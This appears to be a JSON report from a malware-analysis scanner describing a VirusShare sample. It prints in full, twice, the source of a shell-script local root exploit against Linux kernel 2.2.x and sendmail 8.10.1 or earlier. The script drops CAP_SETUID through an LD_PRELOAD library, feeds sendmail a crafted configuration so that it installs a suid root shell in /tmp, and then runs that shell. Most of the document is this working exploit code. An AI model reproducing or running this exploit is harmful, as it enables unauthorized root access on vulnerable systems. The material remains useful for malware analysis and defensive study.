{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "SHELL": "May run an executable file or a system command",
            "execl": "May run an executable file or a system command on a Mac",
            "mkdir": "May create a directory",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/bin/sh\n\necho \"+-----------------------------------------------------------+\"\necho \"|      Linux kernel 2.2.X (X<=15) & sendmail <= 8.10.1      |\"\necho \"|                    local root exploit                     |\"\necho \"|                                                           |\"\necho \"|   Bugs found and exploit written by Wojciech Purczynski   |\"\necho \"|      wp@elzabsoft.pl   cliph/ircnet   Vooyec/dalnet       |\"\necho \"+-----------------------------------------------------------+\"\n\nTMPDIR=/tmp/foo\nSUIDSHELL=/tmp/sush\nSHELL=/bin/tcsh\n\numask 022\necho \"Creating temporary directory\"\nmkdir -p $TMPDIR\ncd $TMPDIR\n\necho \"Creating anti-noexec library (capdrop.c)\"\ncat <<_FOE_ > capdrop.c\n#define __KERNEL__\n#include <linux/capability.h>\n#undef __KERNEL__\n#include <linux/unistd.h>\n_syscall2(int, capset, cap_user_header_t, header, const cap_user_data_t, data)\nextern int capset(cap_user_header_t header, cap_user_data_t data);\nvoid unsetenv(const char*);\nvoid _init(void) {\n\tstruct __user_cap_header_struct caph={_LINUX_CAPABILITY_VERSION, 0};\n\tstruct __user_cap_data_struct capd={0, 0, 0xfffffe7f};\n\tunsetenv(\"LD_PRELOAD\");\n\tcapset(&caph, &capd); \n\tsystem(\"echo|/usr/sbin/sendmail -C$TMPDIR/sm.cf $USER\");\n}\n_FOE_\necho \"Compiling anti-noexec library (capdrop.so)\"\ncc capdrop.c -c -o capdrop.o\nld -shared capdrop.o -o capdrop.so\n\necho \"Creating suid shell (sush.c)\"\ncat <<_FOE_ > sush.c\n#include <unistd.h>\nint main() { setuid(0); setgid(0); execl(\"/bin/sh\", \"sh\", NULL); }\n_FOE_\n\necho \"Compiling suid shell (sush.c)\"\ncc sush.c -o $TMPDIR/sush\n\necho \"Creating shell script\"\ncat <<_FOE_ >script\nmv $TMPDIR/sush $SUIDSHELL\nchown root.root $SUIDSHELL\nchmod 4111 $SUIDSHELL\nexit 0\n_FOE_\n\necho \"Creating own sm.cf\"\ncat <<_FOE_ >$TMPDIR/sm.cf\nO QueueDirectory=$TMPDIR\nO ForwardPath=/no_forward_file\nS0\nR\\$*\t\\$#local \\$: \\$1\nMlocal,\tP=$SHELL, F=lsDFMAw5:/|@qSPfhn9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,\n\tT=DNS/RFC822/X-Unix, A=$SHELL $TMPDIR/script\n_FOE_\n\necho \"Dropping CAP_SETUID and calling sendmail\"\nexport LD_PRELOAD=$TMPDIR/capdrop.so\n/bin/true\nunset LD_PRELOAD\n\necho \"Waiting for suid shell ($SUIDSHELL)\"\nwhile [ ! -f $SUIDSHELL ]; do sleep 1; done\n\necho \"Removing everything\"\ncd ..\nrm -fr $TMPDIR\n\necho \"Suid shell at $SUIDSHELL\"\n$SUIDSHELL\n#                    www.hack.co.za           [12 June]#"
    },
    "filename": "VirusShare_2f09abe77167417bdc7ca9804fe3673e",
    "filesize": 2387,
    "filetype": "POSIX shell script, ASCII text executable, with CRLF line terminators",
    "hashes": {
        "md5": "2f09abe77167417bdc7ca9804fe3673e",
        "sha1": "11e0778a8c2b4491e37bf2539f03d5757df4655d",
        "sha256": "3b67ba848976793933d8e5cb6e27c246ec4bf7b79874530a6a791c5581d9d695"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/bin/sh",
            "echo \"+-----------------------------------------------------------+\"",
            "echo \"|      Linux kernel 2.2.X (X<=15) & sendmail <= 8.10.1      |\"",
            "echo \"|                    local root exploit                     |\"",
            "echo \"|                                                           |\"",
            "echo \"|   Bugs found and exploit written by Wojciech Purczynski   |\"",
            "echo \"|      wp@elzabsoft.pl   cliph/ircnet   Vooyec/dalnet       |\"",
            "echo \"+-----------------------------------------------------------+\"",
            "TMPDIR=/tmp/foo",
            "SUIDSHELL=/tmp/sush",
            "SHELL=/bin/tcsh",
            "umask 022",
            "echo \"Creating temporary directory\"",
            "mkdir -p $TMPDIR",
            "cd $TMPDIR",
            "echo \"Creating anti-noexec library (capdrop.c)\"",
            "cat <<_FOE_ > capdrop.c",
            "#define __KERNEL__",
            "#include <linux/capability.h>",
            "#undef __KERNEL__",
            "#include <linux/unistd.h>",
            "_syscall2(int, capset, cap_user_header_t, header, const cap_user_data_t, data)",
            "extern int capset(cap_user_header_t header, cap_user_data_t data);",
            "void unsetenv(const char*);",
            "void _init(void) {",
            "\tstruct __user_cap_header_struct caph={_LINUX_CAPABILITY_VERSION, 0};",
            "\tstruct __user_cap_data_struct capd={0, 0, 0xfffffe7f};",
            "\tunsetenv(\"LD_PRELOAD\");",
            "\tcapset(&caph, &capd); ",
            "\tsystem(\"echo|/usr/sbin/sendmail -C$TMPDIR/sm.cf $USER\");",
            "_FOE_",
            "echo \"Compiling anti-noexec library (capdrop.so)\"",
            "cc capdrop.c -c -o capdrop.o",
            "ld -shared capdrop.o -o capdrop.so",
            "echo \"Creating suid shell (sush.c)\"",
            "cat <<_FOE_ > sush.c",
            "#include <unistd.h>",
            "int main() { setuid(0); setgid(0); execl(\"/bin/sh\", \"sh\", NULL); }",
            "_FOE_",
            "echo \"Compiling suid shell (sush.c)\"",
            "cc sush.c -o $TMPDIR/sush",
            "echo \"Creating shell script\"",
            "cat <<_FOE_ >script",
            "mv $TMPDIR/sush $SUIDSHELL",
            "chown root.root $SUIDSHELL",
            "chmod 4111 $SUIDSHELL",
            "exit 0",
            "_FOE_",
            "echo \"Creating own sm.cf\"",
            "cat <<_FOE_ >$TMPDIR/sm.cf",
            "O QueueDirectory=$TMPDIR",
            "O ForwardPath=/no_forward_file",
            "R\\$*\t\\$#local \\$: \\$1",
            "Mlocal,\tP=$SHELL, F=lsDFMAw5:/|@qSPfhn9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,",
            "\tT=DNS/RFC822/X-Unix, A=$SHELL $TMPDIR/script",
            "_FOE_",
            "echo \"Dropping CAP_SETUID and calling sendmail\"",
            "export LD_PRELOAD=$TMPDIR/capdrop.so",
            "/bin/true",
            "unset LD_PRELOAD",
            "echo \"Waiting for suid shell ($SUIDSHELL)\"",
            "while [ ! -f $SUIDSHELL ]; do sleep 1; done",
            "echo \"Removing everything\"",
            "cd ..",
            "rm -fr $TMPDIR",
            "echo \"Suid shell at $SUIDSHELL\"",
            "$SUIDSHELL",
            "#                    www.hack.co.za           [12 June]#"
        ],
        "file": {
            "export LD_PRELOAD=$TMPDIR/capdrop.so": "Executable",
            "ld -shared capdrop.o -o capdrop.so": "Executable"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.268731",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
